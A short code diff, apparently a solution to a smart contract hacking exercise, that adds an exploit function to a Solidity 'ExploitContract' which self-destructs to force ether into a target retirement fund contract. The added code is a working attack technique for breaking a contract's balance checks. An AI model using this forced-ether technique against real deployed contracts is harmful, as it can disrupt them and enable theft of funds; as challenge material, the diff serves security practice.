@@ -57,5 +57,9 @@ contract ExploitContract {
         retirementFund = _retirementFund;
     }
 
+    function exploit() public payable {
+        selfdestruct(payable(address(retirementFund)));
+    }
+
     // write your exploit functions below
 }
